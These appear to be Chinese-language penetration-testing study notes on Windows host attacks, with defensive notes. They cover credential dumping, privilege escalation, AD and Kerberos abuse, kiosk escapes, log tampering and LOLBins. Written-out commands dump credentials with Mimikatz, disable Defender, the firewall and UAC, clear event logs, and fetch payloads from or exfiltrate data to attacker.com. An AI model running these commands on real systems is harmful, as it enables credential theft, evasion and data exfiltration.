# 主機攻擊

- **Host-based Attacks**（主機型攻擊）：針對電腦系統進行攻擊的方法
  - 作為滲透測試人員的重要技能，能快速傳播惡意軟體

## 主要技術

- **Privilege Escalation**（權限提升）：獲取系統或網路上更高級別權限的技術
  - 常見方法包括利用系統漏洞或配置疏忽
  - 實際應用包括使用 Metasploit 進行權限提升

- **Credential Harvesting**（憑證收集）：秘密收集用戶憑證的方法
  - 主要工具包括 Mimikatz 和 Rubeus

- **Misconfigured Endpoints**（錯誤配置的端點）：識別和利用常見的安全配置錯誤
  - 可使用 PowerShell 作為工具
  - 常成為初始訪問或橫向移動的易攻擊目標

- **Unquoted Service Paths**（未加引號的服務路徑）：特定的 Windows 配置錯誤
  - 如果服務配置不當，攻擊者可獲得更高權限

- **Disabling Security Software**（禁用安全軟體）：禁用或繞過防毒和其他安全應用程式的技術
  - 目的是維持持續性或避免被檢測

- **Payload Obfuscation**（有效負載混淆）：使惡意軟體更難被安全軟體檢測的方法
  - 通過加密、編碼或偽裝惡意代碼實現

- **User-Control Access Bypass**（用戶控制訪問繞過）：利用 Web 應用程式的方法
  - 通過操作輸入欄位或搜索參數繞過客戶端控制

- **Shell and Kiosk Escapes**（Shell 與資訊亭逃脫）：從受限環境中突破的技術
  - 允許攻擊者訪問底層操作系統

- **Library and Process Injection**（函式庫與程序注入）：在合法程序空間內運行惡意代碼的技術
  - 包括 DLL 注入或 Process Hollowing
  - 使用的工具如 PsExec

- **Log Tampering**（日誌篡改）：修改或刪除日誌以隱藏活動的技術
  - 目的是在受感染主機上維持存在且不被發現

- **Living Off The Land**（原生功能利用）：使用系統自身功能或合法軟體進行惡意活動
  - 使檢測變得更加困難
  - 被認為是更加隱蔽的攻擊方式

# 特權提升工具與技術

- **Privilege Escalation**（特權提升）：獲取系統中比原先預期更高權限的過程
  - 允許攻擊者存取敏感資料或執行受限制的操作
  - 主要利用作業系統和應用程式的信任關係和錯誤配置

## 特權提升類型

- **Vertical Privilege Escalation**（垂直特權提升）：獲取更高權限，如從普通用戶提升至管理員
- **Horizontal Privilege Escalation**（水平特權提升）：存取同級別的帳戶，通常將小權限累積形成更高訪問權限

## 特權提升工具

### Mimikatz

- **Mimikatz**：知名的後滲透工具，用於從記憶體中提取明文密碼、雜湊值和 Kerberos 票證
  - 特別適用於 Windows 系統
  - 從記憶體中提取憑證，用於提升權限或在網路中橫向移動
  - 關鍵命令：
    - `mimikatz # sekurlsa::logonpasswords` - 從記憶體中提取登入密碼
    - `mimikatz # lsadump::sam` - 從 SAM 檔案轉儲雜湊值
    - `mimikatz # sekurlsa::pth /user:administrator /domain:example.com /ntlm:[hash] /run:cmd.exe` - 執行 Pass-the-Hash 攻擊

`Invoke-Mimikatz` 是 PowerSploit 的一部分，可以直接將 Mimikatz 反射 DLL 載入記憶體並執行命令，但現代 EDR 解決方案和 AMSI 很可能會檢測到它。

### Seatbelt

- **Seatbelt**：C# 工具，用於自動執行 Windows 系統安全相關檢查
  - 自動化尋找系統中可被利用進行特權提升的錯誤配置和弱點
  - 關鍵命令：
    - `Seatbelt.exe all` - 執行所有檢查
    - `Seatbelt.exe -group=checkselevated` - 檢查高完整性處理程序
    - `Seatbelt.exe autoruns` - 列出自動執行的可執行檔案

### PowerShell ISE

- **PowerShell Integrated Scripting Environment (ISE)**（PowerShell 整合腳本環境）：PowerShell 的圖形使用者介面和腳本開發環境
  - 提供比傳統 PowerShell 命令列更友善的環境創建、測試和調試腳本
  - 在滲透測試中可用於執行各種主機攻擊
  - 可用於自動化任務如：
    - 系統資訊提取
    - 執行後滲透模組
    - 創建後門

## 防禦與安全考量

若要避免引起不必要的注意，可使用 WES-NG 工具在攻擊機器上進行本地漏洞掃描，而不是在目標系統上執行。使用前需要執行 `wes.py --update` 命令更新資料庫。

PowerShell 具有在記憶體中執行的內建功能，可繞過大多數安全產品。即使在禁止 PowerShell 的環境中，仍有技術可執行 PowerShell。

## 滲透測試重點

- 使用這些工具可有效地識別和利用安全弱點
- Mimikatz 用於提取憑證和執行 Pass-the-Hash 攻擊
- Seatbelt 幫助自動檢測系統錯誤配置
- PowerShell ISE 提供友好環境執行主機攻擊
- 了解這些工具可幫助滲透測試人員展示維護強大安全實踐和定期評估漏洞的重要性

# 憑證收集與傾倒技術

## 憑證收集與傾倒基礎概念

- **Credential Harvesting**（憑證收集）：收集使用者憑證（如用戶名和密碼）的過程
  - 通常透過釣魚攻擊或其他社交工程技術實施
  - 屬於攻擊者獲取憑證的主要方式之一

- **Credential Dumping**（憑證傾倒）：後滲透階段的活動
  - 從已被入侵的系統中提取憑證資訊
  - 屬於獲得系統權限後的進一步橫向移動準備工作

## 常用工具與技術

- **Mimikatz**：提取明文密碼、雜湊值、PIN碼和Kerberos票證的工具
  - 可從Windows系統中的LSASS（Local Security Authority Subsystem Service）進程中提取憑證
  - 常用指令：
    ```
    mimikatz # privilege::debug
    mimikatz # sekurlsa::logonpasswords
    ```
  - 執行結果可能包含明文密碼或可離線破解的NTLM雜湊值

- **Rubeus**：專注於Kerberos票證操作的工具
  - 可執行Pass-the-Ticket攻擊（無需知道使用者密碼即可驗證身份）
  - 支援票證授予票證（TGT）的操作
  - 常用指令示例：
    ```
    Rubeus.exe tgt::renew /user:admin /domain:banksecure.local /sid:[SID值]
    ```
  - 其他功能包含：
    - **asktgt**：建立AS-REQ（TGT請求）流量並獲取票證
    - **kerberoast**：對具有服務主體名稱的帳號實施Kerberoasting攻擊

## Kerberos相關概念

- **Ticket Granting Ticket (TGT)**（票證授予票證）：Kerberos中用於認證使用者的特殊票證
  - 允許用戶無需多次輸入密碼進行身份驗證
  - 可透過Rubeus等工具進行管理和操作

- **Security Identifier (SID)**（安全識別碼）：用於表示使用者和網域的唯一識別碼
  - 在Windows域環境中用於識別使用者身份
  - 在Kerberos票證操作中常作為參數使用

## 防禦措施與緩解策略

- **定期修補**：及時更新系統和應用程式以修補已知漏洞
- **網路分段**：限制攻擊者在網路中的橫向移動能力
- **多因素認證**：防止憑證被盜用後的未授權存取
- **安全監控**：監控並檢測LSASS進程的非法存取嘗試

# 端點設備漏洞與滲透測試技術

## 端點安全與漏洞概念

- **Endpoints**（端點設備）：連接到網路的裝置，如電腦、伺服器和行動裝置
  - 是使用者與網路互動的主要接觸點
  - 當設定錯誤時，成為攻擊者的優先目標

- **Misconfigured Endpoints**（設定錯誤的端點）：存在安全配置問題的裝置
  - 可能有未正確執行的安全政策，如弱密碼
  - 可能有以高權限運行的不必要服務
  - 可能有應該關閉但實際開放的連接埠
  - 這些弱點為攻擊者提供了未授權訪問或權限提升的機會

## 滲透測試工具與技術

- **PowerShell**（微軟強大指令碼語言）：Windows內建的指令碼語言
  - 可用於自動化任務、配置系統和執行命令
  - 如果端點未限制PowerShell功能，滲透測試者可以：
    - 探索系統
    - 識別其他漏洞
    - 提升權限

- **PSExec**（遠程命令執行工具）：Microsoft Sysinternals套件中的工具
  - 允許在遠端系統上執行命令（需要有適當憑證）
  - 運作原理：透過SMB協議和命名管道執行遠端命令
  - 主要組件：
    - `psexec.exe`：在攻擊者系統上執行的客戶端可執行文件
  - 工作流程：
    - 連接到遠端系統
    - 啟動服務（即使出現"逾時"錯誤也可完成執行）
  - 如果端點配置不當，允許不受適當安全控制的遠程命令執行，攻擊者可以利用PSExec在網路中進行橫向移動

## 滲透測試攻擊情境

- **權限提升場景**：
  - 獲取標準使用者工作站（例如通過釣魚攻擊）
  - 發現工作站運行具有系統權限的服務
  - 如果該服務從不安全的目錄執行腳本，可以放置自己的腳本
  - 服務下次運行時，腳本將以系統權限執行

- **橫向移動場景**：
  - 從一個已提權的工作站中找到存儲在記憶體中的憑證
  - 使用PSExec和這些憑證連接到其他機器並執行命令
  - 利用PSExec：
    - 橫向移動：在遠端機器上執行命令，從一個被入侵的系統移動到另一個
    - 權限提升：如果以SYSTEM或管理員權限執行
    - 隱蔽執行：不需要手動安裝，比傳統遠程桌面訪問更難檢測
    - 惡意軟體部署：可用於遠程部署勒索軟體和其他惡意負載

- **檔案伺服器滲透場景**：
  - 通過PSExec獲取檔案伺服器訪問權限
  - 如果伺服器允許任何經過認證的使用者執行命令或訪問敏感文件
  - 可能創建新的管理帳戶或安裝後門以便稍後返回

## 資安防護重點

- 端點設備是網路中最薄弱的環節，為攻擊者提供了入口
- 了解如何使用PowerShell和PSExec等工具識別和利用這些錯誤配置至關重要
- 強化端點安全是防止權限提升和橫向移動攻擊的關鍵

# Unquoted Service Path

- **Unquoted Service Paths**（未加引號的服務路徑）：Windows服務路徑中的一種錯誤配置，當服務路徑包含空格且未被引號包圍時會產生的安全漏洞
  - 攻擊者可利用此漏洞獲取提升的權限
  - 發生原因是Windows可能錯誤解析服務路徑，導致執行攻擊者放置的惡意程式

- **Windows Service Configuration**（Windows服務配置）：每個服務在Windows註冊表中都有定義的可執行路徑
  - 範例路徑：`C:\Program Files\MyService\service.exe`
  - 如果路徑未用引號包圍，Windows會在路徑的各個點尋找可執行檔

- **Path Interpretation**（路徑解釋）：當路徑未加引號時，Windows會依序嘗試執行：
  - `C:\Program.exe`
  - `C:\Program Files\MyService.exe`
  - `C:\Program Files\MyService\service.exe`

- **Exploitation**（利用方式）：攻擊者可在C目錄放置名為Program.exe的惡意程式，Windows可能會以提升的權限執行它

- **Detection Methods**（檢測方法）：使用PowerShell檢查包含空格且未被引號包圍的服務路徑
  - 範例：使用PowerShell腳本檢索所有設為自動啟動的服務，並檢查其路徑是否未加引號

- **PsExec**（遠程執行工具）：強大的命令列工具，用於在Windows系統上遠程管理和執行程序
  - 可用於放置和執行惡意程式到遠程系統
  - 使用方式範例：`PsExec \\FinanceSecureServer -u admin -p password "copy malicious.exe C:\Program.exe"`
  - 利用Windows服務控制管理器（SCM）在遠程系統啟動服務實例，可用於遠程系統管理

- **Mitigation**（緩解措施）：確保所有服務路徑正確地用引號包圍
  - 這個簡單的變更可防止Windows錯誤解釋服務路徑
  - 有助於保護系統免受此類漏洞的攻擊

- **Security Implications**（安全意義）：理解這些技術使滲透測試人員能識別和減輕與未加引號服務路徑相關的潛在安全風險
  - 該漏洞結合弱文件夾權限可能導致從標準用戶提升到本地SYSTEM帳戶的權限

# PowerShell 與 PsExec 用於禁用安全控制

## 基本工具介紹

- **PowerShell**（PowerShell）：Windows 的指令碼語言與命令列殼層
  - 專為任務自動化和配置管理設計
  - 深度整合於 Windows 作業系統
  - 具有強大的系統功能存取能力

- **PsExec**（PsExec）：Microsoft Sysinternals 工具套件的一部分
  - 用於在遠端系統上執行程序
  - 關鍵特性是可遠端操作

## 使用 PowerShell 禁用安全控制

- **Windows Defender 停用方法**（Disabling Windows Defender）：
  - 停止服務指令：`Stop-Service -Name "WinDefend" -Force`
  - 防止重啟後自動開啟：`Set-Service -Name "WinDefend" -StartupType Disabled`

- **修改登錄檔禁用即時保護**（Registry Modification）：
  - `Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Value 1`

## 使用 PsExec 結合 PowerShell 在遠端禁用安全控制

- **PsExec 遠端執行 PowerShell**（Remote PowerShell Execution）：
  - 基本語法：`psexec \$$target_ip] -u [username] -p [password] powershell.exe -ExecutionPolicy Bypass -File [path_to_script]`
  - 此指令會使用提供的憑證連接遠端機器，繞過 PowerShell 執行政策限制

- **遠端禁用防火牆**（Disabling Firewall Remotely）：
  - PowerShell 指令：`Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False`
  - 此指令會在遠端機器上禁用所有網路設定檔的防火牆

- **遠端禁用 UAC**（Disabling UAC Remotely）：
  - `psexec \$$Target_ip] -u [username] -p [password] reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f`
  - 此指令修改遠端機器的登錄檔，禁用使用者帳戶控制（UAC）

## 遠端管理與安全性

- **PowerShell Remoting**（PowerShell 遠端處理）：
  - 在大多數 Windows 機器上預設是禁用的
  - 攻擊者可使用 `Enable-PSRemoting -Force` 開啟此功能
  - 常見方法是使用 WMIC 遠端執行 PowerShell 命令

- **WinRM**（Windows 遠端管理）：
  - 是一種允許使用者與遠端系統互動的 Windows 服務和協定
  - 可用於執行可執行文件、修改登錄檔、修改服務等

## 防禦繞過技術

- **防火牆禁用**（Firewall Disabling）：
  - Windows 系統可利用 `netsh` 命令行工具修改防火牆配置
  - 攻擊者可能插入特定規則，允許與攻擊者控制的域名或 IP 地址之間的流量

## 滲透測試應用

- **PowerShell 利用**（PowerShell Exploitation）：PowerShell 腳本如 `Invoke-Mimikatz` 可直接在記憶體中載入並執行
  - 可用於遠端執行命令或腳本塊，前提是擁有目標機器憑證且 WinRM 已啟用

- **滲透測試工具**（Penetration Testing Tools）：[rapid7.com](https://www.rapid7.com/db/modules/exploit/windows/local/powershell_remoting/) 提供了使用 PowerShell Remoting (TCP 47001) 在目標機器上注入有效負載的模組

# Payload Obfuscation 有效負載混淆

- **Payload Obfuscation**（有效負載混淆）：指將惡意有效負載偽裝成合法有效負載，以避免被安全工具偵測的技術
  - 主要目標是透過改變外觀但不改變功能性來使有效負載更難被識別
  - 對於攻擊者確保有效負載能成功傳遞和執行至目標系統至關重要
  - 常見混淆方法包括編碼、加密、壓縮和程式碼操作

- **Payload**（有效負載）：一段一旦傳遞到目標系統後執行特定功能的程式碼
  - 可能包括反向 Shell（提供遠端存取）或勒索軟體指令碼（加密受害者機器上的檔案）

- **Encoding**（編碼）：透過將有效負載轉換為不同格式來改變其外觀
  - 例如使用 Base64 編碼

- **Encryption**（加密）：將有效負載加密使其呈現為隨機數據
  - 在執行時才會解密

- **Compression**（壓縮）：壓縮有效負載以改變其二進位結構

- **Code manipulation**（程式碼操作）：修改程式碼結構
  - 方法包括插入垃圾程式碼、重命名變數或改變控制流程

- **PowerShell**（PowerShell）：可用於混淆有效負載的工具
  - 攻擊者可以利用 PowerShell 編碼、壓縮或加密有效負載
  - 常見技術如使用 Base64 來轉換原始有效負載，幫助繞過基於字串的偵測機制

- **PsExec**（PsExec）：允許在其他系統上遠端執行程序的工具
  - 工作原理：
    - 通過 SMB 連接到遠端系統上的隱藏 ADMIN$ 共享（映射到 C:\Windows 資料夾）
    - 使用服務控制管理器（SCM）在遠端系統上啟動 PsExecsvc 服務並啟用命名管道
  - 組成部分：
    - psexec.exe：在攻擊者系統上執行的客戶端可執行檔，連接到遠端系統並安裝臨時服務
    - psexecsvc.exe：在目標系統上安裝的服務，用於啟用遠端命令執行

- **Evil-WinRM**（Evil-WinRM）：常用於滲透測試的工具，特別是用於與 Windows 遠端管理（WinRM）服務互動
  - 可用於在目標系統上執行混淆的有效負載
  - 允許執行複雜指令碼同時維持與目標機器的安全連接

- **WinRM**（Windows 遠端管理）：用於遠端執行 Windows 命令的微軟服務
  - Evil-WinRM 利用這個服務來遠端執行混淆後的 PowerShell 有效負載

- **Lateral Movement**（橫向移動）：在網路內部從一台已被入侵的機器移動到其他機器的技術
  - PsExec 和 Evil-WinRM 都是實現橫向移動的常用工具
  - 為了增加獵捕 PsExec 的精確度，組織可以禁止管理員使用它，轉而使用更安全的 PowerShell Remoting

# 滲透測試中的 AD 相關工具和技術

## AD 環境滲透測試概述

- 主要針對的工具和技術：
  - AD 憑證偽造
  - Kerberos 操縱
  - 使用 Evil-WinRM 進行遠端管理

## AD 憑證服務 (AD CS)

- **Active Directory Certificate Services (AD CS)**（AD 憑證服務）：管理用於身份驗證、加密和其他安全功能的憑證系統
  - 當 AD CS 配置不當時，可能會成為嚴重的安全漏洞

- **Certify**：用於探索和利用 AD CS 漏洞的工具
  - 可用於請求任何服務帳戶的憑證（如果憑證模板配置不當）
  - 可利用此漏洞獲取高權限帳戶（如網域管理員）的身份驗證憑證
  - 攻擊難以被檢測，因為它利用了組織自身的基礎設施

- **憑證攻擊實例**：
  - 從一個低權限的工作站獲取初始立足點
  - 使用 Certify 掃描找出設定錯誤的憑證模板
  - 特別關注允許任何用戶請求「Kerberos 認證」選項的憑證模板
  - 請求高權限帳戶的憑證，以該身份進行身份驗證

## Kerberos 操縱

- **Kerberos**：AD中主要的身份驗證協議
  - 雖然基本安全，但存在已知弱點可供利用

- **Rubius**：用於操縱 Kerberos 票證的攻擊工具
  - 可以與 Kerberos 票證互動，提供對網域的強大訪問權限

- **Pass-the-Ticket 攻擊**：
  - 從記憶體中竊取有效的 Kerberos 票證
  - 重複使用票證向其他服務進行身份驗證

- **Golden Ticket**（黃金票證）：具有持久性的高級攻擊
  - 需要先獲取 krbtgt 帳戶的雜湊值（通常通過域控制器憑證轉儲）
  - 允許創建任何用戶的有效 Kerberos 票證
  - 可冒充包括網域管理員在內的任何用戶
  - 除非重置 krbtgt 雜湊值，否則即使更改了被破壞的用戶憑證，Golden Ticket 仍然有效

- **Mimikatz**：常用於從域控制器提取 krbtgt 雜湊值

## Evil-WinRM

- **Evil-WinRM**：重要的 Post-Exploitation 工具
  - 通過 HTTP 使用 PowerShell 遠程協議執行 Windows 命令
  - 在獲取憑據後用於在網路中橫向移動
  - 允許遠程身份驗證並直接執行命令

- **Evil-WinRM 的使用場景**：
  - 當您已經獲取了目標系統的憑據後
  - 連接到允許遠程管理的機器
  - 探索系統尋找敏感信息（如硬編碼的管理員憑據）
  - 提升權限和橫向移動到網路中的其他系統

## 工具總結

- **Certify**：
  - 用途：發現和利用 AD 憑證服務的錯誤配置
  - 優勢：請求不應授予的憑證，獲取更高權限

- **Rubius**：
  - 用途：操作 Kerberos 票證 
  - 優勢：可重放票證、偽造 Golden Ticket 等多種 Kerberos 攻擊

- **Evil-WinRM**：
  - 用途：Post-exploitation 階段使用的工具
  - 優勢：遠程執行命令、提升權限、橫向移動

# Shell Escape 與 Kiosk Escape

## 核心概念

- **Shell Escape**（Shell 逃逸）：打破受限制的 shell 環境以獲取對底層系統的未授權存取
  - 適用於使用者只被授予有限命令存取權的環境，如共享主機或容器化環境

- **Kiosk Escape**（資訊站逃逸）：繞過公共或資訊站系統上的限制，以存取完整的作業系統或其他未授權區域
  - 適用於公共場所如資訊站、ATM 或網咖等限制用戶互動的系統

## Shell Escape 技術

- **通過漏洞應用程式逃逸**：
  - 利用允許執行其他程式的命令
  - 透過可被利用執行系統命令的漏洞應用程式

- **編輯器逃逸技術**：
  - 使用 vi 或 nano 等文字編輯器
  - 在命令模式輸入 `:!bash` 或 `:!sh` 來生成一個 shell

- **PowerShell 逃逸**：
  - 利用特定 cmdlet 獲取更廣泛存取權
  - 範例：`Invoke-Expression -Command "cmd.exe"`
    - 透過 Invoke-Expression cmdlet 執行命令或表達式
    - 調用 cmd.exe 啟動新的命令提示符，有效逃離受限制的 PowerShell 環境

## Kiosk Escape 技術

- **瀏覽器利用技術**：
  - 利用網頁瀏覽器功能獲取更多控制權
  - 使用「另存新檔」對話框存取檔案系統
    1. 嘗試在資訊站開啟網頁瀏覽器
    2. 嘗試從網際網路下載檔案
    3. 「另存新檔」對話框出現時，可以瀏覽檔案系統
    4. 尋找可執行檔或命令提示符以獲取更多存取權

- **PowerShell 指令利用**：
  - 透過網頁應用程式或設定錯誤的服務執行命令
  - 範例：使用 `Invoke-WebRequest` 從遠端伺服器下載 PowerShell 腳本，儲存到本地系統，然後使用 `powershell.exe` 繞過執行策略執行惡意程式碼

- **Windows Management Instrumentation (WMI) 利用**：
  - 如果能存取 WMI，可執行系統管理命令
  - 範例腳本功能：終止當前 explorer.exe 實例並啟動新的實例，可能提供對先前受限的桌面和其他系統功能的存取權

## 常見逃脫技術

- **按鍵組合**：
  - CTRL + N：在大多數桌面瀏覽器中會開啟新視窗，可能是功能完整的瀏覽器實例
  - CTRL + SHIFT + P：幾乎在所有瀏覽器中都可呼出列印對話框

- **列印對話框利用**：
  - 通過「尋找印表機」功能存取檔案總管
  - Windows 10 中：CTRL + P → 「更多設定」→ 「使用系統對話框列印」→ 「尋找印表機」

## Windows Kiosk 模式

- **Windows Kiosk Mode**（指派存取）：Windows 作業系統的一項功能，將電腦或設備限制為特定應用程式
  - 用戶僅限於使用指定的應用程式，無法存取桌面、開始選單、工作列或其他應用程式
  - 廣泛應用於資訊站、零售展示、互動展覽或自助服務站等公共環境

## 安全建議

- 瞭解並實踐這些技術有助於識別和緩解真實環境中的類似漏洞
- 對於管理員：確保適當配置限制環境，移除不必要的應用程式和功能
- 定期檢查和更新安全設定

# 程序注入攻擊技術

## 基本概念

- **Process Injection**（程序注入）：將程式碼注入到另一個正在執行程序的記憶體空間中執行的技術
  - 常用於規避偵測、提升權限或繞過安全控制
  - 通過注入合法程序，攻擊者可利用系統對該程序的信任，使攻擊更隱蔽有效
  - 可以繼承目標程序的權限，繞過安全限制

## 主要注入技術

- **DLL Injection**（動態連結程式庫注入）：將動態連結程式庫載入目標程序的記憶體空間
  - 注入後的 DLL 可以使用與目標程序相同的權限執行程式碼
  - 常用於操控程序行為或添加惡意功能

- **Process Hollowing**（程序挖空）：攻擊者創建一個暫停狀態的新程序，替換其記憶體內容為惡意程式碼，然後恢復程序執行
  - 注入的程式碼在原始受信任程序的環境中執行
  - 特別有效於規避偵測，因為被注入的程序看起來是合法的

- **Reflective DLL Injection**（反射式 DLL 注入）：直接從記憶體載入 DLL 而非從磁碟讀取
  - 偏好被攻擊者使用，可避免在檔案系統留下痕跡
  - DLL 不會接觸硬碟，增加隱蔽性

- **Remote Thread Injection**（遠端執行緒注入）：在遠端程序中創建新執行緒，並指向含有惡意程式碼的記憶體位置
  - 允許攻擊者在現有程序環境中執行程式碼
  - 可能繞過安全控制並提升權限

## EternalBlue 與程序注入

- **EternalBlue**（永恆之藍）：利用 Windows 操作系統 SMB 版本 1 協議中的漏洞的攻擊工具
  - 允許以系統級權限遠端執行程式碼
  - 結合程序注入技術可在目標系統獲取立足點
  - 可將惡意負載移至更穩定或受信任的程序，確保持久性並避免偵測

## 實際應用考量

- **Process Migration**（程序遷移）：技術上不是真正的遷移，而是通過創建執行緒將惡意代碼注入另一個程序的過程
  - 只能遷移到權限相符的程序
  - 目標選擇因素包括：程序穩定性、權限級別、監控程度

- **Target Selection**（目標選擇）：選擇適當的目標程序非常重要
  - 長時間運行的背景程序較不易崩潰或重啟，提供更好的持久性
  - 系統常見程序可使惡意活動看起來更合法

## 防禦難點

- 在另一個程序的上下文中運行程式碼可能繞過安全產品檢測，因為執行行為被隱藏在合法程序下
- 程序注入有多種變種和實現方式，使防禦更加困難
- 真實環境中需考慮權限限制，並非所有程序都可被注入

# 日誌篡改

## 基本概念

- **Log Tampering**（日誌篡改）：修改或刪除日誌檔案以掩蓋攻擊者行蹤的行為
  - 日誌對於鑑識調查和監控未授權活動至關重要
  - 攻擊者通常會篡改日誌以避免被檢測並阻礙調查過程

## 日誌類型與重要性

- **Logs**（日誌）：在滲透測試中通常指由作業系統、應用程式和網路設備生成的記錄
  - 捕捉各種事件：用戶憑證、檔案訪問、配置變更和網路連接
  - 提供寶貴的審計線索，有助於識別可疑活動和潛在的安全漏洞

## 日誌篡改方法

- **日誌篡改技術**：
  - 刪除特定日誌條目
  - 修改時間戳記
  - 更改日誌資料以創建虛假記錄
  - 目的是移除入侵痕跡或誤導調查人員

## 常用工具

- **PowerShell**：用於日誌篡改的常見工具
  - 可用於與 Windows 事件日誌互動
  - 具有適當權限的攻擊者可以使用 PowerShell 清除或操作這些日誌
  - 常見命令：Clear-EventLog（清除指定的事件日誌）

- **PsExec**（Process Execute）：遠端管理工具
  - 允許使用者在其他系統上執行進程
  - 由 Mark Russinovich 在 90 年代創建，後被微軟收購
  - 可用於在遠端機器上執行 PowerShell 腳本或其他命令
  - 常用參數：-s（以系統帳戶執行，通常具有清除事件日誌的權限）
  - 對系統管理員有用，但也可被攻擊者利用

## 日誌清除的檢測指標

- **Windows 安全事件日誌 ID 1102**：表示審計日誌已被嘗試清除
- **Windows 系統事件日誌 ID 104**：表示系統日誌被清除
- **事件 ID 4697**（安全日誌事件）和 **7045**（系統日誌事件）：表示與 PsExec 類似工具相關的新服務已安裝

## 防護措施

- **日誌保護策略**：
  - 使用日誌完整性和監控工具
  - 設置可疑日誌活動的警報
  - 確保日誌安全備份和存儲
  - Windows 事件日誌是安全監控、鑑識和事件響應的基本數據來源

## 滲透測試價值

- 了解攻擊者如何篡改日誌，可以幫助滲透測試人員更好地保護這些關鍵數據源
- 有助於實施措施來檢測和防止日誌篡改
- 確保鑑識調查的完整性

# Living off the Land Binaries (LOLBins) 

- **Living off the Land Binaries (LOLBins)（原生系統二進位檔攻擊）**：合法、預先安裝在作業系統中的工具和實用程式，攻擊者和滲透測試人員可以利用這些工具執行各種操作，而無需引入外部工具或惡意軟體
  - 這種方法可幫助避開安全工具的檢測，因為這些二進位檔是受信任且通常被列入白名單的
  - 使用LOLBins可以在受感染系統上執行各種行動，同時將被檢測的風險降到最低

## 常見的LOLBins工具及用途

- **PowerShell**：Windows系統上的強大腳本語言和命令列介面
  - 可用於收集目標系統信息
  - 例如：`Get-Process > C:\Temp\processes.txt` 列出所有運行進程並將輸出保存到檔案

- **BITSAdmin.exe**：用於管理背景智慧傳輸服務(BITS)的命令列工具
  - 可用於從網路下載檔案
  - 例如：`bitsadmin /transfer myJob /download /priority high http://attacker.com/payload.exe C:\Temp\payload.exe`

- **Regsvr32**（註冊伺服器）：用於註冊和撤銷DLL註冊的工具
  - 可用於執行託管在遠端伺服器上的腳本
  - 這種攻擊技術有時被稱為"Squiblydoo"
  - 例如：`regsvr32 /s /n /u /i:http://attacker.com/script.sct scrobj.dll`
  - 此方法不會修改註冊表，因為COM物件實際上沒有被註冊，只被執行

- **Schtasks.exe**（排程工作）：Windows上管理排程任務的工具
  - 可用於創建以特權執行的工作
  - 需要提升的權限
  - 例如：`schtasks /create /tn "MaintenanceTask" /tr C:\Temp\malware.exe /sc onlogon /ru "SYSTEM"`

- **Certutil.exe**（憑證工具）：管理憑證的命令列工具
  - 可用於編碼和解碼資料，有助於資料外洩
  - 例如：`certutil -encode C:\sensitivedata.txt C:\encoded.txt`
         `curl -d @C:\encoded.txt http://attacker.com/exfil`

## 防禦建議

- 組織需要實施強大的監控和警報機制來檢測合法工具的異常使用
- [CrowdStrike Falcon OverWatch](https://www.crowdstrike.com/en-us/blog/8-lolbins-every-threat-hunter-should-know/) 觀察到各種國家和網路犯罪者利用LOLBins進行各種功能—包括偵察、修改系統配置、資料破壞和執行惡意代碼
- 根據[The SOC Labs](https://thesoclabs.com/what-are-lolbins-and-list-of-lolbins/)，其他常見的LOLBins還包括at、cmd.exe、msiexec和conhost等

## 滲透測試建議

- LOLBins是滲透測試人員武器庫中的強大工具
- 通過理解和利用這些本機實用程式，可以進行隱蔽且有效的滲透測試
- 確保在商定的參與範圍內合乎道德地進行測試